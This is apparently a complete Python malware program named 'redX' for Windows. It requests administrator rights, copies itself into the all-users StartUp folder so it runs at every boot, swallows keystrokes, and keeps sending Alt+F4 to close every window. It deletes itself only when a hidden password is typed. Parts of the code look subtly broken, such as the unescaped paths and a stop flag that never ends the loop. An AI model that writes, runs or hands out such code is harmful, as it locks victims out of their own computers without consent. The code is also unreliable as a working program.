# I will not show the ways for either linux or mac at this point.
import keyboard
import os
import pyautogui as gui
import pyuac
import shutil
import sys

keyList = []  # This uses list data collection as dump variable to check if the desired string exists or not
passwd = "j4nda"  # One word to stop this all. (Don't use whitespace or any special characters)
run = True


def getKeys():
    key_event = keyboard.read_event(suppress=True)  # Module utilities

    if key_event.event_type == "down":  # Module utilities
        key_pressed(key_event)  # Call another function
    else:
        pass


def key_pressed(event):  # Processing the keys
    global dump  # Assign global variable
    keyboardListen = str(event).replace("KeyboardEvent(", "").replace(" down)", "")  # Module utilities
    keyList.append(keyboardListen)  # As the variable name implies, it listens any key being pressed
    dump = ''.join(keyList)
    # print(dump) # Debugging


def copyStartUp():
    if not os.path.exists(
            "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\redX.exe"):  # If malware not exists in the path

        if not pyuac.isUserAdmin():
            pyuac.runAsAdmin()  # Asks admin permission for copying the malware

        else:  # If admin permission already granted
            shutil.copy(__file__,
                        "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp")  # Copy itself in the startup folder


def eradicateCheck():
    if passwd in dump:  # If the password string tracked in the dump variable
        run = False
        os.remove(
            "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\redX.exe")  # Deletes the startup version
        os.remove(sys.argv[0])  # Deletes itself


while run:
    eradicateCheck()  # Eradicate me or not yet?
    copyStartUp() # Copy to startup folder
    getKeys()  # Listen keys
    gui.hotkey("alt", "f4")
